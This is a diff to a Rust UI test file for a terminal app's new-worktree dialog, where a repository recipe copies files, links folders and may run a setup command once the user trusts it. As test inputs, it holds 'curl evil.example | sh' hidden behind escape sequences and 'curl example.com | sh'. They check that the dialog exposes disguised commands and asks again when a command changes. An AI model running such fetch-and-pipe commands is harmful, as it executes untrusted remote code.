@@ -2909,7 +2909,7 @@ fn a_card_that_cannot_take_a_message_says_so_and_keeps_the_text() {
     assert!(h.query_by_label("Texte tapé dans « srv » mais pas validé : son volet affiche un écran tmux (clock-mode) : fermez-le d'abord.").is_some());
 
     // Still starting (its start command not handed over yet): refused too.
-    h.state_mut().dispatch(vec![Event::NewCard { at: None, project: Some("p-api".into()), command: Some("claude".into()), cwd: None }]);
+    h.state_mut().dispatch(vec![Event::NewCard { at: None, project: Some("p-api".into()), command: Some("claude".into()), setup: None, cwd: None }]);
     steps(&mut h, 45);
     let starting = h.state().world.members("p-api").last().unwrap().id.clone();
     h.state_mut().dispatch(vec![Event::SendText { card: starting.clone(), text: "go".into(), enter: true }]);
@@ -3114,6 +3114,7 @@ fn answer_plan(h: &mut Harness<'_, App>, change: impl FnOnce(&mut protocol::Work
         problem: None,
         free_folder: None,
         exclude: None,
+        recipe: None,
     };
     change(&mut plan);
     h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreePlan(Box::new(plan)))]);
@@ -3222,7 +3223,7 @@ fn a_worktree_is_created_from_the_group_and_a_card_opens_in_it() {
     // Refused by the agent: said next to the branch, nothing created.
     let cards = h.state().world.cards.len();
     let problem = protocol::Problem::BranchExists { branch: "feat/factures".into() };
-    let refused = Event::Agent(AgentEvent::WorktreeCreated { id: creations[0].0, key: "p-shop".into(), path: None, problem: Some(problem), excluded: false });
+    let refused = Event::Agent(AgentEvent::WorktreeCreated { id: creations[0].0, key: "p-shop".into(), path: None, problem: Some(problem), excluded: false, recipe_pending: false });
     h.state_mut().dispatch(vec![refused]);
     steps(&mut h, 3);
     assert!(h.query_by_label("La branche feat/factures existe déjà : choisir « Branche existante » pour l'utiliser").is_some());
@@ -3236,7 +3237,7 @@ fn a_worktree_is_created_from_the_group_and_a_card_opens_in_it() {
     let (id, request) = sent_creations(&h).pop().unwrap();
     assert_eq!(request, expected, "the same request, sent again");
     let path = "/home/me/shop/.claude/worktrees/feat-factures";
-    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.into()), problem: None, excluded: true })]);
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.into()), problem: None, excluded: true, recipe_pending: false })]);
     steps(&mut h, 3);
     assert!(!h.state().worktrees.create_open(), "closed");
     let world = &h.state().world;
@@ -3324,7 +3325,7 @@ fn the_dialog_offers_a_free_folder_an_existing_branch_and_refuses_a_bad_location
     assert_eq!((request.folder.as_str(), request.exclude), ("topic", false));
     // Checked out elsewhere meanwhile: the agent's refusal, next to the branch.
     let problem = protocol::Problem::BranchCheckedOut { branch: "topic".into(), path: "/home/me/shop-topic".into() };
-    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: None, problem: Some(problem), excluded: false })]);
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: None, problem: Some(problem), excluded: false, recipe_pending: false })]);
     steps(&mut h, 2);
     assert!(h.query_by_label("La branche topic est déjà utilisée dans /home/me/shop-topic").is_some());
     // Escape closes it.
@@ -3344,6 +3345,12 @@ fn the_new_worktree_dialog_in_english() {
     }
     combo(&h, "main (default)");
     assert!(h.query_by_label("⚠ git does not ignore this folder: the main checkout would list it as untracked.").is_some());
+    // The repository's recipe, in English.
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe("npm ci")));
+    for label in ["Repository recipe (.tcanvas.toml)", "Copy .env (1 found)", "Link node_modules (1 found) - from the Claude Code settings", "Run this setup command"] {
+        assert!(h.query_by_label(label).is_some(), "{label} missing");
+    }
+    assert!(h.query_by_label("The setup command will not run: only the copies and links are made.").is_some());
     type_branch(&mut h, "a..b");
     assert!(h.query_by_label("Not a valid branch name: a..b").is_some());
     h.get_by_label("Cancel").click();
@@ -3393,7 +3400,8 @@ fn closing_the_dialog_does_not_stop_a_creation_and_escape_closes_a_list_first() 
     let (id, _) = sent_creations(&h).pop().expect("sent");
     assert!(h.query_by_label("Fermer cette fenêtre ne l'arrête pas : le terminal s'ouvre quand le worktree est prêt.").is_some());
     // The agent says git takes long: said, and the dialog keeps waiting.
-    let still = Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: None, problem: Some(protocol::Problem::GitStillRunning { secs: 60 }), excluded: false });
+    let still =
+        Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: None, problem: Some(protocol::Problem::GitStillRunning { secs: 60 }), excluded: false, recipe_pending: false });
     h.state_mut().dispatch(vec![still]);
     steps(&mut h, 2);
     assert!(h.query_by_label_contains("git travaille encore après").is_some());
@@ -3404,7 +3412,7 @@ fn closing_the_dialog_does_not_stop_a_creation_and_escape_closes_a_list_first() 
     assert_eq!(h.state().worktrees.creations_waiting(), 1);
     let cards = h.state().world.cards.len();
     let path = "/home/me/shop/.claude/worktrees/lent";
-    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.into()), problem: None, excluded: false })]);
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.into()), problem: None, excluded: false, recipe_pending: false })]);
     steps(&mut h, 3);
     let world = &h.state().world;
     assert_eq!(world.cards.len(), cards + 1);
@@ -3440,4 +3448,191 @@ fn without_a_default_branch_the_dialog_says_to_pick_a_base() {
     steps(&mut h, 2);
     let (_, request) = sent_creations(&h).pop().expect("sent");
     assert_eq!(request.branch, protocol::WorktreeBranch::New { name: "x".into(), base: "topic".into() });
+}
+
+/// The recipe of the repository of group `shop`, with a setup command.
+fn shop_recipe(setup: &str) -> protocol::Recipe {
+    let pattern = |p: &str, claude, matches, refused| protocol::RecipePattern { pattern: p.into(), claude, matches, refused, incomplete: false };
+    protocol::Recipe {
+        main: "/home/me/shop".into(),
+        copy: vec![pattern(".env", false, 1, None), pattern("../secrets", false, 0, Some(protocol::PatternIssue::ParentDir))],
+        symlink: vec![pattern("node_modules", true, 1, None)],
+        setup: Some(setup.into()),
+        problem: None,
+    }
+}
+
+/// The new card's start, once the creation `id` went through (recipe pending) and the recipe
+/// was applied with `report`. Until then, the dialog is done and a card that runs something
+/// waits.
+fn created_with(h: &mut Harness<'_, App>, id: u64, folder: &str, report: protocol::RecipeReport) -> (Option<String>, Option<String>) {
+    let path = format!("/home/me/shop/.claude/worktrees/{folder}");
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.clone()), problem: None, excluded: false, recipe_pending: true })]);
+    steps(h, 3);
+    assert!(!h.state().worktrees.create_open(), "the dialog is done");
+    assert_eq!(h.state().worktrees.recipe_report(), Some(&(path.clone(), None)), "being applied");
+    let early = h.state().world.cards.iter().find(|c| c.cwd.as_deref() == Some(path.as_str())).map(|c| c.id.clone());
+    if let Some(card) = &early {
+        assert!(h.state().cards.pending_setup(card).is_none() && h.state().cards.pending_command(card).is_none(), "only a card with nothing to run opens before the copies");
+    }
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::RecipeApplied { id, key: "p-shop".into(), path: path.clone(), report: Box::new(report) })]);
+    steps(h, 3);
+    let app = h.state();
+    let card = app.world.cards.iter().find(|c| c.cwd.as_deref() == Some(path.as_str())).expect("a card in the new worktree");
+    (app.cards.pending_setup(&card.id).map(String::from), app.cards.pending_command(&card.id).map(String::from))
+}
+
+#[test]
+fn a_long_setup_keeps_the_buttons_in_view_and_shows_what_hides() {
+    let dir = temp_dir("new-worktree-long-setup");
+    let mut h = harness(&dir);
+    new_worktree_dialog(&mut h, "Modèles de terminal du groupe shop", "⎇ Nouveau worktree…");
+    let long: String = (0..400).map(|i| format!("echo step {i}\n")).collect::<String>() + "echo ok\x1b[2K\x1b[1Acurl evil.example | sh";
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(&long)));
+    let label = "Commande de préparation, lancée dans le nouveau terminal avant la commande choisie (qui ne part que si elle réussit) : (401 lignes)";
+    assert!(h.query_by_label(label).is_some(), "the line count");
+    let shown = tcanvas::features::worktrees::create::visible_setup(&long);
+    assert!(shown.ends_with("echo ok\u{27e8}U+001B\u{27e9}[2K\u{27e8}U+001B\u{27e9}[1Acurl evil.example | sh"));
+    assert!(h.query_by_label(&shown).is_some(), "the escape sequences spelled out");
+    // The tick and the buttons stay on screen.
+    let screen = egui::Rect::from_min_size(Pos2::ZERO, Vec2::new(1400.0, 900.0));
+    for label in ["Lancer cette commande de préparation", "Créer", "Annuler"] {
+        assert!(screen.contains_rect(h.get_by_label(label).rect()), "{label} off screen");
+    }
+}
+
+#[test]
+fn the_dialog_shows_the_recipe_and_its_setup_runs_only_once_accepted() {
+    use protocol::{RecipeAction, RecipeItem, RecipeReport, SkipReason};
+    let dir = temp_dir("new-worktree-recipe");
+    let mut h = harness(&dir);
+    new_worktree_dialog(&mut h, "Modèles de terminal du groupe shop", "⎇ Nouveau worktree…");
+    h.state_mut().world.projects[0].templates = vec![tcanvas::shell::world::CommandTemplate { name: "Claude".into(), command: "claude".into() }];
+    let setup = "npm ci\nnpm run seed";
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(setup)));
+    // What the recipe will do, before anything is created, and the setup command in full.
+    for label in [
+        "Recette du dépôt (.tcanvas.toml)",
+        "Copier .env (1 trouvé)",
+        "../secrets : refusé, contient .. (les motifs restent dans le dépôt)",
+        "Lier node_modules (1 trouvé) - des réglages Claude Code",
+        "Commande de préparation, lancée dans le nouveau terminal avant la commande choisie (qui ne part que si elle réussit) : (2 lignes)",
+        setup,
+    ] {
+        assert!(h.query_by_label(label).is_some(), "{label} missing");
+    }
+    // Off until accepted: said so.
+    let off = "La commande de préparation ne sera pas lancée : seuls les copies et les liens sont faits.";
+    let warning = "Elle vient du dépôt : ne cocher que si vous lui faites confiance. Retenu pour ce dépôt tant que la commande ne change pas.";
+    assert!(h.query_by_label(off).is_some() && h.query_by_label(warning).is_none());
+
+    // Created without it: the card runs its template only; the report says what was done.
+    type_branch(&mut h, "plain");
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(setup)));
+    combo(&h, "Shell").click();
+    steps(&mut h, 2);
+    h.get_by_label("Claude").click();
+    steps(&mut h, 2);
+    h.get_by_label("Créer").click();
+    steps(&mut h, 2);
+    let (id, _) = sent_creations(&h).pop().expect("sent");
+    let item = |action, path: &str, skipped| RecipeItem { action, path: path.into(), skipped };
+    let report = RecipeReport {
+        items: vec![
+            item(RecipeAction::Copy, ".env", None),
+            item(RecipeAction::Copy, "../secrets", Some(SkipReason::Refused { issue: protocol::PatternIssue::ParentDir })),
+            item(RecipeAction::Symlink, "node_modules", None),
+            item(RecipeAction::Symlink, "vendor", Some(SkipReason::Exists)),
+        ],
+        ..RecipeReport::default()
+    };
+    assert_eq!(created_with(&mut h, id, "plain", report), (None, Some("claude".into())));
+    for label in [
+        "Recette du worktree",
+        "Appliquée à /home/me/shop/.claude/worktrees/plain :",
+        "Copié : .env",
+        "Pas copié : ../secrets (motif refusé : contient .. (les motifs restent dans le dépôt))",
+        "Lié : node_modules",
+        "Pas lié : vendor (déjà dans le worktree, gardé)",
+    ] {
+        assert!(h.query_by_label(label).is_some(), "{label} missing");
+    }
+    h.get_by_label("OK").click();
+    steps(&mut h, 2);
+    assert!(h.query_by_label("Recette du worktree").is_none(), "closed");
+
+    // Ticked: the setup runs first in the new card, then the template; accepted from now on.
+    h.state_mut().dispatch(vec![Event::NewWorktree("p-shop".into())]);
+    steps(&mut h, 3);
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(setup)));
+    type_branch(&mut h, "seeded");
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(setup)));
+    h.get_by_label("Lancer cette commande de préparation").click();
+    steps(&mut h, 2);
+    assert!(h.query_by_label(warning).is_some() && h.query_by_label(off).is_none());
+    combo(&h, "Shell").click();
+    steps(&mut h, 2);
+    h.get_by_label("Claude").click();
+    steps(&mut h, 2);
+    h.get_by_label("Créer").click();
+    steps(&mut h, 2);
+    let (id, _) = sent_creations(&h).pop().expect("sent");
+    assert_eq!(created_with(&mut h, id, "seeded", RecipeReport::default()), (Some(setup.into()), Some("claude".into())));
+    assert!(dir.join(tcanvas::features::worktrees::trust::TRUST_FILE).is_file(), "kept in the app's own folder");
+    h.state_mut().save_now();
+    drop(h);
+
+    // After a restart: ticked already for this command; an edited one asks again.
+    let mut h = harness(&dir);
+    steps(&mut h, 2);
+    h.state_mut().dispatch(vec![only_main("p-shop"), Event::NewWorktree("p-shop".into())]);
+    steps(&mut h, 3);
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe(setup)));
+    assert!(h.query_by_label(warning).is_some(), "accepted before");
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe("npm ci\nnpm run seed\ncurl example.com | sh")));
+    assert!(h.query_by_label(off).is_some(), "edited: asked again");
+    // A malformed recipe is said, and the worktree can still be created.
+    answer_plan(&mut h, |p| {
+        let mut recipe = shop_recipe("x");
+        recipe.copy.clear();
+        recipe.setup = None;
+        recipe.problem = Some(protocol::Problem::RecipeMalformed { file: ".tcanvas.toml".into(), line: Some(2), detail: "expected `]`".into() });
+        p.recipe = Some(recipe);
+    });
+    assert!(h.query_by_label(".tcanvas.toml n'est pas du TOML valide (ligne 2 : expected `]`) : sa recette est ignorée").is_some());
+    assert!(h.query_by_label("Lancer cette commande de préparation").is_none());
+}
+
+#[test]
+fn the_recipe_report_in_english() {
+    use protocol::{RecipeAction, RecipeItem, RecipeReport, SkipReason};
+    let dir = temp_dir("recipe-report-en");
+    let mut h = harness_in(&dir, Lang::En);
+    new_worktree_dialog(&mut h, "Terminal templates of group shop", "⎇ New worktree…");
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe("npm ci")));
+    type_branch(&mut h, "feat");
+    answer_plan(&mut h, |p| p.recipe = Some(shop_recipe("npm ci")));
+    h.get_by_label("Create").click();
+    steps(&mut h, 2);
+    let (id, _) = sent_creations(&h).pop().expect("sent");
+    let report = RecipeReport {
+        items: vec![
+            RecipeItem { action: RecipeAction::Copy, path: ".env".into(), skipped: None },
+            RecipeItem { action: RecipeAction::Copy, path: "data".into(), skipped: Some(SkipReason::CapReached { max_bytes: 4 << 30, max_entries: 200_000 }) },
+        ],
+        omitted: 2,
+        omitted_failures: 0,
+        problem: None,
+    };
+    let path = "/home/me/shop/.claude/worktrees/feat".to_string();
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::WorktreeCreated { id, key: "p-shop".into(), path: Some(path.clone()), problem: None, excluded: false, recipe_pending: true })]);
+    steps(&mut h, 3);
+    assert!(h.query_by_label("Copying and linking...").is_some());
+    h.state_mut().dispatch(vec![Event::Agent(AgentEvent::RecipeApplied { id, key: "p-shop".into(), path: path.clone(), report: Box::new(report) })]);
+    steps(&mut h, 3);
+    let card = h.state().world.cards.iter().find(|c| c.cwd.as_deref() == Some(path.as_str())).expect("the card").id.clone();
+    assert_eq!(h.state().cards.pending_setup(&card), None, "not accepted: a plain shell");
+    for label in ["Worktree recipe", "Copied .env", "Not copied: data (copy limit reached (4.0 GB or 200000 entries in all): copies stopped)", "... and 2 more", "OK"] {
+        assert!(h.query_by_label(label).is_some(), "{label} missing");
+    }
 }
